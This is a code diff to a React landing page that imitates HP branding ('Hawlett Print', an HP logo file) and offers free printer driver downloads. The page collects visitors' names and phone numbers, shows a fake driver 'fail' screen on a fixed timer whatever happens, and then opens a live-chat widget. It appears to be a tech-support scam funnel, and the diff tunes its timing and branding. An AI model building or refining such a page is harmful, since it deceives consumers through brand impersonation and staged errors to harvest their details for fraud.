@@ -7,13 +7,12 @@ export default function HPLandingPage() {
     const [modelNumber, setModelNumber] = useState('');
     const [showModal, setShowModal] = useState(false);
     const [modalStep, setModalStep] = useState(1);
-    const [connectionType, setConnectionType] = useState(''); // 'usb' or 'wifi'
+    const [connectionType, setConnectionType] = useState('');
     const [fullName, setFullName] = useState('');
     const [phoneNumber, setPhoneNumber] = useState('');
     const [supportTicket, setSupportTicket] = useState('');
-    const [state, handleSubmit] = useForm("xqaylanz"); // Replace with your Formspree form ID
+    const [state, handleSubmit] = useForm("xqaylanz");
 
-    // Load JivoChat script when on Step 5 or Step 6
     useEffect(() => {
         if (modalStep === 5 || modalStep === 6) {
             // Check if script is already loaded
@@ -21,7 +20,7 @@ export default function HPLandingPage() {
             if (!existingScript) {
                 const script = document.createElement('script');
                 script.id = 'jivochat-script';
-                script.src = '//code.jivosite.com/widget/anGWZz65D4';
+                script.src = '//code.jivosite.com/widget/ZQnxf4SKf3';
                 script.async = true;
                 document.body.appendChild(script);
             }
@@ -57,7 +56,7 @@ export default function HPLandingPage() {
         // After 6 seconds, show fail modal
         setTimeout(() => {
             setModalStep(5); // Go to fail modal
-        }, 15000);
+        }, 10000);
     }, []);
 
     const handleRetry = useCallback(() => {
@@ -65,7 +64,7 @@ export default function HPLandingPage() {
         // After 6 seconds, show fail modal again
         setTimeout(() => {
             setModalStep(5); // Go to fail modal
-        }, 15000);
+        }, 10000);
     }, []);
 
     const handleNeedAssistance = useCallback(() => {
@@ -99,9 +98,9 @@ export default function HPLandingPage() {
                     <div className="flex items-center gap-4 sm:gap-8 w-full">
                         {/* logo */}
                         <img
-                            src="/new-hp-logo.svg"
+                            src="/HP_logo.webp"
                             alt="Hawlett Print"
-                            className="w-16 h-12 object-contain"
+                            className="w-12 h-12 object-contain"
                             loading="eager"
                         />
 
@@ -184,6 +183,7 @@ export default function HPLandingPage() {
                     <div className="grid grid-cols-1 md:grid-cols-2 gap-8 sm:gap-10 lg:gap-12">
                         {/* Form Section */}
                         <div>
+                            <p className="text-gray-700 mb-4 sm:mb-6 text-xl font-semibold sm:text-xl">Quick Download Free Drivers</p>
                             <p className="text-gray-700 mb-4 sm:mb-6 text-xs sm:text-sm">Fill the form and download your printer driver</p>
                             <div className="mb-4">
                                 <label className="block text-gray-700 font-semibold mb-2 text-xs sm:text-sm">Model Number:</label>
